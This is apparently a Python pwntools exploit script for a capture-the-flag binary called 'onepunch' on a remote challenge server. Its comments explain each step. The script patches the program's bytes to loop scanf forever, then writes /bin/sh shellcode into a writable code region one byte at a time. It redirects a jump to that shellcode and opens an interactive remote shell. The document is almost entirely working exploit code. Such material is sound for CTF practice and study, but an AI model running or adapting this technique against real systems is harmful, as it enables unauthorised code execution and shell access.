#!/usr/bin/env python3
from pwn import *

context(arch='amd64')

r = remote('hackme.inndy.tw', 7718)
#r = process('./onepunch')

#gdb.attach(r)
r.sendline(b'0x400768 195') # Infinite scanf (loop back address of jne)
r.sendline(b'0x400767 235') # Infinite scanf (jne -> jmp)

# Put the shellcode in writable area (0x400000~0x401000)
# But I choose this area since I only need to change one more byte to jump
shellcode = asm(shellcraft.sh())
writable = 0x4006e9 

for c in shellcode:
    r.sendline('{} {}\n'.format(hex(writable), c).encode())
    writable += 1

r.sendline(b'0x400768 128') # Jump back to "writable" (only change one byte)

r.interactive()
